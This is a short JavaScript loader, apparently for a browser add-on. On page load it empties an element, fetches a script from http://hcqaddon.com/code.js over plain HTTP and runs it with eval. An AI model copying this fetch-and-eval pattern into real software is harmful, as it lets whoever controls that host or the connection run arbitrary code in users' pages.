window.addEventListener("load", async () => {
	globalThis.addonApp = true;
	document.getElementsByClassName("orenosakuhin")[0].innerHTML = ""
	fetch("http://hcqaddon.com/code.js", {
		cache: "no-store",
	})
		.then((n) => n.text())
		.then(eval);
});
